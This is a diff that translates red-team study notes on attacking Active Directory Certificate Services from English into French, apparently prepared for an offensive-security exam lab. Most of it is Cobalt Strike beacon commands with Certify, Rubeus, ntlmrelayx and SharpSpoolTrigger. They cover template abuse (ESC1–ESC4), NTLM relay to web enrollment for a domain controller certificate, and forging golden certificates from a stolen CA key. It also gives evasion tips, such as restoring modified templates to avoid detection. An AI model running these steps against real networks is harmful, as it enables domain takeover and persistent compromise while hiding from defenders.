@@ -1,13 +1,13 @@
-# Active Directory Certificate Services (ADCS)
+# Active Directory Certificate Services (AD CS)
 
-Based on Certified Pre-Owned (2021). Focus: misconfig-based privesc and persistence.
+Basé sur **Certified Pre-Owned (2021)**. Sujet : Privilege Escalation et Persistence liées aux mauvaises configurations AD CS.
 
-> All `execute-assembly` is **OPSEC-CAUTION** — fork & run spawns a sacrificial process.
-> Prefer chaining Certify+Rubeus inline where possible to limit process spawns.
+> Toute utilisation de `execute-assembly` est classée **OPSEC-CAUTION** dans ces notes : fork & run crée un processus temporaire.
+> Les notes recommandent d'enchaîner Certify et Rubeus lorsque c'est possible afin de limiter les créations de processus.
 
 ---
 
-## Enumeration
+## Énumération
 
 ```cs
 // Enumerate CAs — check for ESC8 web enrollment, vulnerable CA flags
@@ -19,21 +19,21 @@ beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-c
 beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
 ```
 
-**Key flags to look for in template output:**
-| Flag | Significance |
+**Points à rechercher dans les résultats des certificate templates :**
+| Flag | Signification |
 |------|-------------|
-| `ENROLLEE_SUPPLIES_SUBJECT` | Requestor controls SAN → ESC1 abuse |
-| `Manager Approval = False` | No human review needed |
-| `Authorized Signatures = 0` | No co-signer required |
-| EKU: `Client Authentication` | Cert usable for Kerberos auth |
-| EKU: `Certificate Request Agent` | Can sign requests on behalf of others → ESC3 |
-| EKU: `Any Purpose` or blank | No restriction → ESC2 |
+| `ENROLLEE_SUPPLIES_SUBJECT` | Le demandeur contrôle le SAN → possibilité d'ESC1 |
+| `Manager Approval = False` | Aucune validation manuelle requise |
+| `Authorized Signatures = 0` | Aucune cosignature requise |
+| EKU : `Client Authentication` | Certificat utilisable pour l'authentification Kerberos |
+| EKU : `Certificate Request Agent` | Peut signer une demande au nom d'un autre utilisateur → ESC3 |
+| EKU : `Any Purpose` ou vide | Pas de restriction d'usage → ESC2 |
 
 ---
 
-## ESC1 — Misconfigured Client Authentication Templates
+## ESC1 — Client Authentication Templates mal configurés
 
-**Conditions:** Client Auth EKU + `ENROLLEE_SUPPLIES_SUBJECT` + no manager approval + low-priv enroll rights
+**Conditions :** EKU Client Authentication + `ENROLLEE_SUPPLIES_SUBJECT` + absence de Manager Approval + droits d'enrollment pour des comptes peu privilégiés.
 
 ```cs
 // Step 1: Request cert specifying target UPN in SAN
@@ -58,9 +58,9 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
 
 ---
 
-## ESC2 — Misconfigured Any Purpose / Blank EKU Templates
+## ESC2 — Templates avec Any Purpose ou EKU vide
 
-**Conditions:** `Any Purpose` EKU (OID `2.5.29.37.0`) or empty EKU field (treated as SubCA)
+**Conditions :** EKU `Any Purpose` (OID `2.5.29.37.0`) ou champ EKU vide (considéré comme SubCA).
 
 ```cs
 // Enumerate (same command — output will show Any Purpose EKU)
@@ -73,11 +73,11 @@ beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-t
 
 ---
 
-## ESC3 — Misconfigured Certificate Request Agent Templates
+## ESC3 — Certificate Request Agent Templates mal configurés
 
-**Conditions:** `Certificate Request Agent` EKU enabled + no manager approval + low-priv enroll rights
+**Conditions :** EKU `Certificate Request Agent` actif, aucune Manager Approval et droits d'enrollment peu restreints.
 
-Two-step abuse: obtain agent cert → use it to enroll as another user.
+Exploitation en deux étapes : obtenir un certificat agent, puis l'utiliser pour demander un certificat au nom d'un autre utilisateur.
 
 ```cs
 // Step 1: Request agent certificate using current user context
@@ -101,9 +101,9 @@ beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe reques
 
 ---
 
-## ESC4 — Certificate Template Access Control (ACE Abuse)
+## ESC4 — Contrôle d'accès aux Certificate Templates (ACE)
 
-**Conditions:** Low-priv principal has one of: Owner, FullControl, WriteOwner, WriteProperty, WriteDacl on a template
+**Conditions :** un principal peu privilégié dispose sur un template d'un droit Owner, FullControl, WriteOwner, WriteProperty ou WriteDacl.
 
 ```cs
 // Identify via enum-templates output — look for non-admin principals with write perms
@@ -124,30 +124,30 @@ beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage
 //   --client-auth / --pkinit-auth / --smartcard-logon → toggle auth EKUs
 ```
 
-> After modifying the template, proceed with ESC1 exploitation.
-> **Restore the template afterwards** to avoid detection and exam OPSEC score deductions.
+> Après modification du template, poursuivre avec l'exploitation ESC1.
+> **Restaurer ensuite le template** pour limiter les traces et les pénalités OPSEC lors de l'examen.
 
 ---
 
-## ESC8 — NTLM Relay to ADCS HTTP Web Enrollment
+## ESC8 — NTLM Relay vers AD CS HTTP Web Enrollment
 
-**Conditions:** CA has web enrollment (`http://<ca>/certsrv/`) not protected by HTTPS + Channel Binding disabled
+**Conditions :** la CA expose Web Enrollment (`http://<ca>/certsrv/`) sans protection HTTPS et avec Channel Binding désactivé.
 
-**Check:**
+**Vérification :**
 ```cs
 // OPSEC-CAUTION
 beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
 ```
 
-**Attack chain — relay DC auth to get DC certificate → S4U2self to DA:**
+**Chaîne d'attaque :** NTLM Relay de l'authentification DC → certificat DC → S4U2self vers Domain Admin.
 
-### 1. Validate port 445 is bound (PID 4 = kernel)
+### 1. Vérifier l'écoute du port 445 (PID 4 = kernel)
 ```cs
 // OPSEC-SAFE (BOF)
 beacon> netstat
 ```
 
-### 2. Disable lanmanserver auto-restart then stop services in order
+### 2. Désactiver le redémarrage automatique de lanmanserver puis arrêter les services dans l'ordre
 ```cs
 // OPSEC-CAUTION — modifies service config, generates event logs
 beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
@@ -156,27 +156,27 @@ beacon> sc_stop srv2
 beacon> sc_stop srvnet
 ```
 
-> **WARNING:** Unbinding 445 breaks SMB shares and SMB Beacons on that machine.
-> Do NOT do this on a critical server or machine running an SMB Beacon.
+> **Attention :** libérer le port 445 interrompt les partages SMB et les SMB Beacons de cette machine.
+> Ne pas effectuer cette manipulation sur un serveur critique ou une machine hébergeant un SMB Beacon.
 
-### 3. Verify 445 is unbound
+### 3. Vérifier que le port 445 est libre
 ```cs
 beacon> netstat
 ```
 
-### 4. Set up reverse port forward (routes 445 traffic to local ntlmrelayx on port 7445)
+### 4. Configurer un reverse port forward (trafic 445 vers ntlmrelayx local sur le port 7445)
 ```cs
 // OPSEC-SAFE (Beacon native)
 beacon> rportfwd_local 445 localhost 7445
 ```
 
-### 5. Start SOCKS proxy for ntlmrelayx to reach ADCS endpoint
+### 5. Démarrer un SOCKS proxy pour permettre à ntlmrelayx d'atteindre AD CS
 ```cs
 // OPSEC-SAFE (Beacon native)
 beacon> socks 1080 socks5
 ```
 
-### 6. On attacker Kali — run ntlmrelayx (Docker container, port 7445 mapped to 445 inside)
+### 6. Depuis Kali, lancer ntlmrelayx (container Docker, port 7445 mappé vers 445)
 ```bash
 proxychains impacket-ntlmrelayx \
   -t http://10.10.120.5/certsrv/certfnsh.asp \
@@ -185,7 +185,7 @@ proxychains impacket-ntlmrelayx \
   --template DomainController
 ```
 
-### 7. Coerce DC authentication with SharpSpoolTrigger
+### 7. Déclencher l'authentification DC avec SharpSpoolTrigger
 ```cs
 // OPSEC-CAUTION — triggers SpoolSS auth coercion from DC
 beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe \
@@ -193,7 +193,7 @@ beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Rele
   <compromised_host_IP>
 ```
 
-### 8. ntlmrelayx catches relay → downloads DC PFX → use with Rubeus
+### 8. ntlmrelayx récupère le relay → certificat PFX DC → utilisation avec Rubeus
 ```cs
 // OPSEC-CAUTION
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
@@ -205,7 +205,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
 // Then S4U2self to get DA service tickets
 ```
 
-### Cleanup
+### Cleanup — Restauration
 ```cs
 beacon> rportfwd stop 445
 beacon> socks stop
@@ -214,11 +214,11 @@ beacon> socks stop
 
 ---
 
-## DPERSIST1 — Golden Certificates (CA Key Theft)
+## DPERSIST1 — Golden Certificates (récupération de la clé CA)
 
-**Conditions:** Shell/Beacon on the CA server itself (Tier 0 access)
+**Conditions :** disposer d'un Shell ou Beacon sur le serveur CA (accès Tier 0).
 
-> Equivalent to krbtgt theft. Forged certs are valid until expiry and survive password resets.
+> Les notes rapprochent cette attaque du vol de `krbtgt`. Les certificats forgés peuvent rester valides jusqu'à expiration, même après un changement de mot de passe.
 
 ```cs
 // Step 1: Confirm you're on the CA
@@ -256,40 +256,40 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
   /nowrap
 ```
 
-> The forged cert remains valid until its End Date. Certificate revocation does NOT invalidate it unless CRL checking catches the serial (and the CA is online). Treat stolen CA keys as permanent domain compromise.
+> Le certificat forgé reste valable jusqu'à sa date de fin. Sa révocation n'a d'effet que si les contrôles CRL détectent son numéro de série, selon les conditions décrites. Une clé CA compromise doit être traitée comme une compromission majeure du domaine.
 
 ---
 
-## OPSEC Summary
+## Récapitulatif OPSEC
 
-| Technique | Tier | Notes |
+| Technique | Niveau | Remarques |
 |-----------|------|-------|
-| `enum-cas` / `enum-templates` | CAUTION | execute-assembly spawns sacrificial proc |
-| ESC1 request | CAUTION | execute-assembly; cert request logged in CA event log (Event 4886/4887) |
-| ESC3 request-agent | CAUTION | Two cert requests — two CA log entries |
-| ESC4 manage-template | CAUTION | Template modification logged in AD |
-| ESC8 rportfwd_local | SAFE | Beacon native, no child proc |
-| ESC8 socks | SAFE | Beacon native |
-| ESC8 sc_stop services | CAUTION | Service stop events (7036), breaks SMB |
-| ESC8 SharpSpoolTrigger | CAUTION | Auth coercion generates network traffic |
-| DPERSIST1 dump-certs | CAUTION | Runs on CA — high-value target, monitored |
-| DPERSIST1 forge (offline) | SAFE | No beacon/network activity |
-| Rubeus asktgt w/ cert | CAUTION | TGT request via PKINIT — logged as Event 4768 |
+| `enum-cas` / `enum-templates` | CAUTION | `execute-assembly` crée un processus temporaire |
+| Demande ESC1 | CAUTION | `execute-assembly` ; demande enregistrée sur la CA (Events 4886/4887) |
+| ESC3 request-agent | CAUTION | Deux demandes de certificat et deux entrées dans les logs CA |
+| ESC4 manage-template | CAUTION | Modification du template enregistrée dans AD |
+| ESC8 rportfwd_local | SAFE | Fonction native Beacon, sans child process |
+| ESC8 socks | SAFE | Fonction native Beacon |
+| ESC8 sc_stop services | CAUTION | Événements d'arrêt de service (7036), interruption SMB |
+| ESC8 SharpSpoolTrigger | CAUTION | Authentification forcée produisant du trafic réseau |
+| DPERSIST1 dump-certs | CAUTION | Exécution sur la CA, cible sensible et surveillée |
+| DPERSIST1 forge (offline) | SAFE | Pas d'activité Beacon ou réseau |
+| Rubeus asktgt avec certificat | CAUTION | Demande TGT via PKINIT, Event 4768 |
 
-**CA Event IDs to be aware of (logged on CA):**
-- `4886` — Certificate request received
-- `4887` — Certificate issued
-- `4888` — Certificate request denied
+**Events CA à connaître :**
+- `4886` — Demande de certificat reçue
+- `4887` — Certificat émis
+- `4888` — Demande refusée
 
 ---
 
-## EKU OID Reference
+## Référence des OID EKU
 
-| OID | Name |
+| OID | Désignation |
 |-----|------|
 | `1.3.6.1.5.5.7.3.2` | Client Authentication |
 | `1.3.6.1.5.5.7.3.1` | Server Authentication |
 | `1.3.6.1.5.5.7.3.4` | Secure Email |
 | `1.3.6.1.4.1.311.10.3.4` | EFS |
-| `2.5.29.37.0` | Any Purpose (abuse via ESC2) |
-| *(blank)* | Treated as Subordinate CA — unrestricted |
+| `2.5.29.37.0` | Any Purpose (exploitation via ESC2) |
+| *(vide)* | Considéré comme une Subordinate CA, sans restriction |
